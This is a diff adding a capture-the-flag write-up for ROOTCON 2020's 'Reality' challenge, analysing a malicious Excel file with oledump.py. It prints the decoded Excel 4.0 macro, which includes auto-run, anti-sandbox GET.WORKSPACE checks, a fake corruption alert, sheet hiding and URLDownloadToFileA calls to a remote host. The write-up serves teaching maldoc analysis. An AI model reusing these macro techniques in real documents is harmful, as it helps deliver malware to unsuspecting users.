@@ -1,15 +1,243 @@
 ---
 layout: menu
 title: "Reality Challenge"
-description: ""
+description: "You must obtain the hidden secrets in order to see the reality."
 header-img: "chals/ctf/2020_ROOTCONEasterEggHunt/screenshots/banner.png"
-tags: [ctf, capture-the-flag, challenges, challenge-write-ups, write-ups, writeups, write-up, writeup, rootcon, rootcon easter egg hunt, rootcon-easter-egg-hunt, easter egg hunt, easter-egg-hunt, solutions, 2020, reality]
+tags: [ctf, capture-the-flag, challenges, challenge-write-ups, write-ups, writeups, write-up, writeup, rootcon, rootcon easter egg hunt, rootcon-easter-egg-hunt, easter egg hunt, easter-egg-hunt, solutions, 2020, reality, maldoc, ole, object linking and embedding, oledump, oledump.py, excel, xls, hidden column, excel formula, excel functions]
 ---
 
+:filesdir: /chals/ctf/2020_ROOTCONEasterEggHunt/files/
 :imagesdir: ./screenshots/
 :stem: latexmath
 :page-liquid:
+:source-highlighter: rouge
 
 +++<span><h1 style="color:red">Reality Challenge</h1></span>+++
 
 ---
+
+== PART 1 : GIVEN FILES
+
+* link:{filesdir}reality.tar.gz[power.tar.gz]
+____
+[source,shell]
+----
+$ md5sum reality.tar.gz
+
+  4f494a43e54d1ba0936e58a299f25fc0  reality.tar.gz
+
+$ sha1sum reality.tar.gz
+
+  f74ea01066dc1b1bd25a900def3d7bd1b410f9be  reality.tar.gz
+
+$ gzip -d reality.tar.gz
+
+$ tar xvf reality.tar.gz
+
+  reality/
+  reality/readme.txt
+  reality/topsecret.xls
+
+----
+____
+
+---
+
+== PART 2 : CHALLENGE DESCRIPTION
+
+The file, +++<span style="color:orange">+++`readme.txt`+++</span>+++, reads the following:
+
+____
+----
+Challenge Description:
+
+        You must obtain the hidden secrets in order to see the reality.
+----
+____
+
+---
+
+== PART 3 : THE MALDOC
+
+Opening +++<span style="color:orange">+++`topsecret.xls`+++</span>+++ reveals nothing much:
+
+____
+image::reality_topsecret.png[topsecret.xls]
+____
+
+Microsoft Excel is capable of using +++<span style="color:orange">+++OLE (Object Linking and Embedding)+++</span>+++ which allows you to take objects in a document and place it in other applications or perhaps even itself.
+
+I decided to check if the excel file is using *`Object Linking and Embedding`* using link:https://blog.didierstevens.com/programs/oledump-py/[oledump.py,window=_blank]:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ python oledump.py -p plugin_biff --pluginoptions "-x" "../topsecret.xls"
+
+  ---omitted---
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 FORMULA : Cell Formula - R50C18 len=576 ptgRefV R500C49154 ptgRefV R501C49154 ptgConcat ---omitted--- ptgRefV R593C49154 ptgConcat ptgAttr ptgRef R50C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 FORMULA : Cell Formula - R51C18 len=254 ptgRefV R500C49156 ptgRefV R501C49156 ptgConcat ---omitted--- ptgRefV R540C49156 ptgConcat ptgRef R51C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 FORMULA : Cell Formula - R52C18 len=254 ptgRefV R500C49158 ptgRefV R501C49158 ptgConcat ---omitted--- ptgRefV R540C49158 ptgConcat ptgRef R52C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 FORMULA : Cell Formula - R53C18 len=224 ptgRefV R500C49160 ptgRefV R501C49160 ptgConcat ---omitted--- ptgRefV R535C49160 ptgConcat ptgRef R53C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 FORMULA : Cell Formula - R54C18 len=224 ptgRefV R500C49162 ptgRefV R501C49162 ptgConcat ---omitted--- ptgRefV R535C49162 ptgConcat ptgRef R54C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    414 FORMULA : Cell Formula - R55C18 len=392 ptgRefV R500C49164 ptgRefV R501C49164 ptgConcat ---omitted--- ptgRefV R563C49164 ptgConcat ptgRef R55C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    888 FORMULA : Cell Formula - R56C18 len=866 ptgRefV R500C49167 ptgRefV R501C49167 ptgConcat ---omitted--- ptgRefV R642C49167 ptgConcat ptgRef R56C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    108 FORMULA : Cell Formula - R57C18 len=86 ptgRefV R500C49169 ptgRefV R501C49169 ptgConcat ---omitted--- ptgRefV R512C49169 ptgConcat ptgRef R57C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006     37 FORMULA : Cell Formula - R58C18 len=15 ptgStr "calc.exe" ptgFuncVarV args 1 func EXEC (0x006e)
+  #0006     37 FORMULA : Cell Formula - R59C18 len=15 ptgStr "Sheet2" ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE (0x817f)#
+  ---omitted---
+
+----
+____
+
+There is a sheet hidden using *`WORKBOOK.HIDE`*:
+
+____
+image::reality_sheet2.png[Sheet2]
+____
+
+Which has the following Excel functions written vertically with each character placed beside to the right of its ASCII decimal value:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+=ALERT("The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt.",2)
+=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)
+=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)
+=IF(GET.WORKSPACE(19),,CLOSE(FALSE))
+=IF(GET.WORKSPACE(42),,CLOSE(FALSE))
+=IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))), ,CLOSE(FALSE))
+#=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://easteregg.rootcon.net/AZfzv7ckfbxj2Q6X/GC3Z543PZQL2buV ","c:\Users\Public\flag.txt",0,0)#
+=CLOSE(FALSE)
+----
+____
+
+---
+
+== PART 4 : GETTING THE FLAG
+
+The highlighted function from earlier seems to download a file and then is saved to +++<span style="color:orange">+++c:\Users\Public\flag.txt+++</span>+++ and attempting to download the same file gives you:
+
+____
+image:GC3Z543PZQL2buV6.jpg[fake flag]
+____
+
+The flag is somewhere else...
+
+Going back to the OLE dump:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ python oledump.py -p plugin_biff --pluginoptions "-x" "../topsecret.xls"
+
+  ---omitted---
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 #FORMULA# : Cell Formula - R50C18 len=576 ptgRefV #R500C49154# ptgRefV #R501C49154# ptgConcat ---omitted--- ptgRefV #R593C49154# ptgConcat ptgAttr ptgRef #R50C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 #FORMULA# : Cell Formula - R51C18 len=254 ptgRefV #R500C49156# ptgRefV #R501C49156# ptgConcat ---omitted--- ptgRefV #R540C49156# ptgConcat ptgRef #R51C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 #FORMULA# : Cell Formula - R52C18 len=254 ptgRefV #R500C49158# ptgRefV #R501C49158# ptgConcat ---omitted--- ptgRefV #R540C49158# ptgConcat ptgRef #R52C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 #FORMULA# : Cell Formula - R53C18 len=224 ptgRefV #R500C49160# ptgRefV #R501C49160# ptgConcat ---omitted--- ptgRefV #R535C49160# ptgConcat ptgRef #R53C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 #FORMULA# : Cell Formula - R54C18 len=224 ptgRefV #R500C49162# ptgRefV #R501C49162# ptgConcat ---omitted--- ptgRefV #R535C49162# ptgConcat ptgRef #R54C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    414 #FORMULA# : Cell Formula - R55C18 len=392 ptgRefV #R500C49164# ptgRefV #R501C49164# ptgConcat ---omitted--- ptgRefV #R563C49164# ptgConcat ptgRef #R55C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    888 #FORMULA# : Cell Formula - R56C18 len=866 ptgRefV #R500C49167# ptgRefV #R501C49167# ptgConcat ---omitted--- ptgRefV #R642C49167# ptgConcat ptgRef #R56C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    108 #FORMULA# : Cell Formula - R57C18 len=86 ptgRefV #R500C49169# ptgRefV #R501C49169# ptgConcat ---omitted--- ptgRefV #R512C49169# ptgConcat ptgRef #R57C49171# ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006     37 FORMULA : Cell Formula - R58C18 len=15 ptgStr "calc.exe" ptgFuncVarV args 1 func EXEC (0x006e)
+  0006     37 FORMULA : Cell Formula - R59C18 len=15 ptgStr "Sheet2" ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE (0x817f)
+  ---omitted---
+
+----
+____
+
+It seems that the eight formulas written vertically from earlier are being referenced in +++<span style="color:orange">+++ROWS 50-57+++</span>+++ in +++<span style="color:orange">+++COL 49171+++</span>+++ and the characters starting from +++<span style="color:orange">+++ROW 500+++</span>+++ downward are being concatenated using +++<span style="color:orange">+++ptgConcat+++</span>+++ to build the entire function/formula.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ python oledump.py -p plugin_biff --pluginoptions "-x" "../topsecret.xls"
+
+  ---omitted---
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 FORMULA : Cell Formula - R50C18 len=576 ptgRefV R500##C49154## ptgRefV R501C49154 ptgConcat ---omitted--- ptgRefV R593C49154 ptgConcat ptgAttr ptgRef R50C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 FORMULA : Cell Formula - R51C18 len=254 ptgRefV R500##C49156## ptgRefV R501C49156 ptgConcat ---omitted--- ptgRefV R540C49156 ptgConcat ptgRef R51C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 FORMULA : Cell Formula - R52C18 len=254 ptgRefV R500##C49158## ptgRefV R501C49158 ptgConcat ---omitted--- ptgRefV R540C49158 ptgConcat ptgRef R52C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 FORMULA : Cell Formula - R53C18 len=224 ptgRefV R500##C49160## ptgRefV R501C49160 ptgConcat ---omitted--- ptgRefV R535C49160 ptgConcat ptgRef R53C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 FORMULA : Cell Formula - R54C18 len=224 ptgRefV R500##C49162## ptgRefV R501C49162 ptgConcat ---omitted--- ptgRefV R535C49162 ptgConcat ptgRef R54C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    414 FORMULA : Cell Formula - R55C18 len=392 ptgRefV R500##C49164## ptgRefV R501C49164 ptgConcat ---omitted--- ptgRefV R563C49164 ptgConcat ptgRef R55C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    888 FORMULA : Cell Formula - R56C18 len=866 ptgRefV R500##C49167## ptgRefV R501C49167 ptgConcat ---omitted--- ptgRefV R642C49167 ptgConcat ptgRef R56C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    108 FORMULA : Cell Formula - R57C18 len=86 ptgRefV R500##C49169## ptgRefV R501C49169 ptgConcat ---omitted--- ptgRefV R512C49169 ptgConcat ptgRef R57C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006     37 FORMULA : Cell Formula - R58C18 len=15 ptgStr "calc.exe" ptgFuncVarV args 1 func EXEC (0x006e)
+  0006     37 FORMULA : Cell Formula - R59C18 len=15 ptgStr "Sheet2" ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE (0x817f)
+  ---omitted---
+
+----
+____
+
+Now, if you consider +++<span style="color:orange">+++COL 49154+++</span>+++ to be +++<span style="color:orange">+++column B in Sheet 2+++</span>+++, then +++<span style="color:orange">+++COL 49156+++</span>+++ should be +++<span style="color:orange">+++column D+++</span>+++, +++<span style="color:orange">+++COL 49158+++</span>+++ should be +++<span style="color:orange">+++column F+++</span>+++, and so on...
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ python oledump.py -p plugin_biff --pluginoptions "-x" "../topsecret.xls"
+
+  ---omitted---
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 FORMULA : Cell Formula - R50C18 len=576 ptgRefV R500C49154 ptgRefV R501C49154 ptgConcat ---omitted--- ptgRefV R593C49154 ptgConcat ptgAttr ptgRef R50C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 FORMULA : Cell Formula - R51C18 len=254 ptgRefV R500C49156 ptgRefV R501C49156 ptgConcat ---omitted--- ptgRefV R540C49156 ptgConcat ptgRef R51C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    276 FORMULA : Cell Formula - R52C18 len=254 ptgRefV R500C49158 ptgRefV R501C49158 ptgConcat ---omitted--- ptgRefV R540C49158 ptgConcat ptgRef R52C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 FORMULA : Cell Formula - R53C18 len=224 ptgRefV R500C49160 ptgRefV R501C49160 ptgConcat ---omitted--- ptgRefV R535C49160 ptgConcat ptgRef R53C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    246 FORMULA : Cell Formula - R54C18 len=224 ptgRefV R500C49162 ptgRefV R501C49162 ptgConcat ---omitted--- ptgRefV R535C49162 ptgConcat ptgRef R54C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    414 FORMULA : Cell Formula - R55C18 len=392 ptgRefV R500##C49164## ptgRefV R501C49164 ptgConcat ---omitted--- ptgRefV R563C49164 ptgConcat ptgRef R55C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    888 FORMULA : Cell Formula - R56C18 len=866 ptgRefV R500##C49167## ptgRefV R501C49167 ptgConcat ---omitted--- ptgRefV R642C49167 ptgConcat ptgRef R56C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006    108 FORMULA : Cell Formula - R57C18 len=86 ptgRefV R500C49169 ptgRefV R501C49169 ptgConcat ---omitted--- ptgRefV R512C49169 ptgConcat ptgRef R57C49171 ptgFuncVarV args 2 func FORMULA (0x8060)
+  0006     37 FORMULA : Cell Formula - R58C18 len=15 ptgStr "calc.exe" ptgFuncVarV args 1 func EXEC (0x006e)
+  0006     37 FORMULA : Cell Formula - R59C18 len=15 ptgStr "Sheet2" ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE (0x817f)
+  ---omitted---
+
+----
+____
+
+The expected columns where the function/formulas are built should be +++<span style="color:orange">+++B -> D -> F -> H -> J -> L -> N -> P+++</span>+++ but as you can see from the dump, +++<span style="color:orange">+++COL 49164+++</span>+++ jumps to +++<span style="color:orange">+++COL 49167+++</span>+++ meaning +++<span style="color:orange">+++column L+++</span>+++ jumped to +++<span style="color:orange">+++column O+++</span>+++ which shouldn't be the case.
+
+If you look at the Excel Sheet, it would reveal that +++<span style="color:orange">+++column N+++</span>+++ is missing and when revealed:
+
+____
+image::reality_column_N.png[column N]
+____
+
+It shows a new set of numbers which when converted to ASCII:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+=CALL("urlmon","URLDownloaToFileA","JJCCJJ",0,"##http://easteregg.rootcon.net/sFpWgx9WkHQQ542K/36xQCWUDNaJpbTB##","c:\Users\Public\flag.txt",0,0)
+----
+____
+
+A new download link is found which is also saved to +++<span style="color:orange">+++c:\Users\Public\flag.txt+++</span>+++:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ cat 36xQCWUDNaJpbTB
+
+  rc_easter{r34l1ty_15_0ft3n__d1s4pp01nt1ng}
+
+----
+____
+
+The real flag is revealed after downloading the file!!
+
+---
+
+++++
+<div style="width:100%;overflow-x:auto"><h2>FLAG : <strong>rc_easter{r34l1ty_15_0ft3n__d1s4pp01nt1ng}</strong></h2></div>
+++++
